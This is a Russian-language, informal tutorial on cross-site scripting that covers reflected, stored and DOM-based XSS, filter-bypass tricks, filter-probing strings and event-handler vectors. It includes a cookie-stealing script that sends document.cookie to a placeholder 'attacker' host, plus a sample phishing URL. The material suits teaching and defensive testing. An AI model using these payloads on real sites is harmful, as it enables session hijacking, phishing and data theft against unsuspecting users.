# Что такое XSS?

XSS - (Cross-site scripting) Это это атака нацеленная на внедрение кода, позволяющая злоумышленнику выполнить вредоносный JavaScript в браузере другого пользователя. Злоумышленник не атакует свою жертву напрямую. Вместо этого он использует уязвимость веб-сайта который посещает жертва и внедряет вредоносный JavaScript код. В браузере жертвы вредоносный JavaScript отображается как легитимная часть веб-сайта, а сам веб-сайт выступает в качестве непосредственного соучастника атакующего.

---

# В чем же цель XSS?

- Украсть cookie.

- Фишинговые атаки(пацанчик хацкер может вставить поддельную форму для входа на страницу, которую вы посещаете, используя мандражирование DOM. 
 
 - Установив action атрибуты формы на свой собственный серваки, потом обмануть пользователя для получения конфиденциальной информации).

- Изменить настройки(типа заменить бэкграунд сайта, всунуть допустим на задний фон джой-казино скрин).

- Размещать различную рекламы на сайте, в всплывающих окнах.

- Кейлогер (хацкер может внедрить типа прослушки действий, выполняющих на клавиатуре пользователем, используя addEventListener, а потом отправить все эти нажатия клавиш  пользователем на свой серверок, записав конфиденциальную информацию пацанчика, например, это может быть пароли и номера кредитных карт. Стремно, согласитесь)

--- 

# Типы XSS:

- Непостоянный (отраженный) XSS
- Постоянный (хранимый) XSS
- XSS DOM-модели

## Непостоянный (отраженный) XSS

  Это самая распространенным на сайтах. В любом поле ввода-(пример 'поиск') введите: <script>alert('xss')</script> , и если у сайта есть уязвимость xss   то ваш js код сработаеть. И если заметите на адресном строке url то он значительно изменился с тех пор как мы еще не вписывали скрипт в поле. Это говорит о том, что не происходит очистка данных в   поле "name", которые передались в урлу, где браузер воспроизвел этот скрипт на стороне клиента. Если же вы перекинете такой урл другому пользователю, то у него же будет такая картина тоже, но если же тот   пользователь уберет скрипт в урле, то такой проблемы у него не будет.

  По такой схеме как раз и работают злоумышленники, находят уязвимость и кидают урл, через всякие мессенджеры и почтовики, с скриптом, который ее воспроизводит у пользователя, которые, в свою  очередь, не подозревают, что
  в конце урла вредоносный скрипт Для обхода фильтрации вторым способом заюзаем ASCII-код. Тут мы слово HI в нашем замечательном алерте alert(HI) переведем как «72 73». С помощью функции String.fromCharCode() можно обойтись
  совсем без кавычек. В конечном итоге будет у нас скрипт выглядеть так <script>alert(String.fromCharCode(72, 73)</script> 

  Именно таким методом можно обходить фильтрацию magic quotes.   Если же вам лень искать их ручками, то можете перейти на статью о том как искать XSS с помощью сканера уязвимостей OWASP ZAP либо BURP SUITE. После того как вы ознакомились с этим всем можно приступить к практике. Следующею статью сделаю с сайтом, где можно будет легально попрактиковаться, не причиняя вред для работы коллег.
  

  РАСПОСТРЯНЯЮТСЯ ПО МЕССЕДЖЕРАМ: ADMIN - можно зарегестрироваться тут: us.bank.com/serach=?<script>alert(33)</script>


## Постоянный (хранимый) XSS

   Этот вид XSS уже считается наиболее разрушительным типом атаки. Этот тип XSS возможен, когда фраеру хацкеру удается закинуть на сервак код(скрипт),  выполняющийся в браузере каждый раз при заходе на запрашиваемую вами страницу. Самым простым примером этой уязвимости являются форумы, на которых разрешено  оставлять комментарии в HTML формате без ограничений. Другими словами, хранимый XSS возникает, когда разработчики осуществляют некорректную фильтрацию при сохранении входных данные в БД на сервере или при записи этих данных в файлы, а затем выводят эти данные в браузер пользователю.

   Понятно теперь, откуда появляются окошки, когда просто посещаешь какой-то сайт и по какой схеме работают злоумышленники, находят уязвимость на сайте, внедряют  скрипт через сайт на сервер, который будет воспроизводиться у каждого пользователя, который посещает сайт. Согласитесь критично видеть на сайте банка какую-то рекламу казино)))


## XSS DOM-модели
   
   Как известно, XSS в DOM появляются на стороне клиента, во время обработки данных внутри самого JavaScript. Данный тип XSS получил такое название, потому, что  чтоб его сделать нам нужен Document Object Model, как вы поняли это вот и сокращение DOM. Через него, можно получать доступ к содержимому HTML и XML-документов, даже изменять  содержимое либо структуру, либо оформление таких документов.

   Как примерчиком XSS в DOM-модели можно взять сценарием, который позволяет пользователю выбрать язык интерфейса на юайке. Язык по умолчанию передается в URL в параметре “default”. 

http://test.site/page.html?default=Ukraine 

   Для того чтоб пощупать этот тип XSS уязвимости в DOM закинем вместо Ukraine запрос:

```
http://test.site/page.html?default=<script>alert(HI)</script>
```

Браузер обрабатывает этот код и выполняет вывод alert(HI).

Допустим как своровать куку у пользователя с помощью кода(скрипта). Нам нужно всего лишь заставить пользователя выполнить в браузере данный скрит:

```
<script>window.location='http://attacker/?cookie='+document.cookie</script>
```    

---

# Причина появление XSS

XSS возникаетьиз за недостаточной фильтрации сайта (когда разработчики осуществляют некорректную фильтрацию при  сохранении входных данные в БД на сервере или при записи этих данных в файлы, а затем выводят эти данные в браузер пользователю.)

Во-первых, XSS возникает при генерации HTML-страницы, когда разработчику нужно поместить туда указанные пользователем данные (ФИО, организация). Если разработчик записал данные в БД, затем тянет ее в HTML-шаблон, то это stored (сохраненный) XSS.

Разработчику могут понадобиться параметры из URL или тела запроса. Такой тип XSS называется reflected.

Причин XSS куча, потому что есть динамические изменения страницы с помощью JS, есть события, которые постоянно происходят на клиентской стороне с JS.

   ---
   
# Проверка фильтрации сайта
 
Просто в любое поле вводим: '';!--"<fuck>=&{()}

Дальше открываем html страничку и ищем слово "fuck"

и смотри последующие сиволы..

Если <> так и остались то это перваый признак уязвимости - значит фильтр имеет дырку.

Если ,"'\ символы остались такими, как были введены - это второй признак уязвимости - возможные дополнительные символы к последующей XSS атаке.

Затем, если открыв HTML, вы не обнаружили <> то скорее всего дырка в фильтре.

Если открыв HTML вы обнаружили, что <> заменены на другие символы, то это облом - фильтр по крайней мере функционирует нормально.

Возможно еще ввести в поле для проверки фильтрации вот так: "><>'"`,/\?@%

Вспомним, как вызывается JavaScript из HTML:

<script>…</script> — всё, что внутри, будет срендерено браузером как JavaScript.

<img onerror="…" src="x">test</a> — можно использовать обработчики событий, то есть атрибут, например, onerror. Браузер попробует подгрузить картинку по источнику x. Если картинка не прогрузится, он выполнит то, что указано в обработчике событий.

<a href="javascript:…">click to trigger javascript</a> — если гиперссылка ведет не на схему HTTP/HTTPS, а начинается со схемы JavaScript, то при нажатии на ссылку всё, что после схемы JavaScript, будет срендерено как JavaScript.

<iframe src="javascript:…"> — то же самое, что и с гиперссылкой, только ничего не надо кликать, сработает при прогрузке.















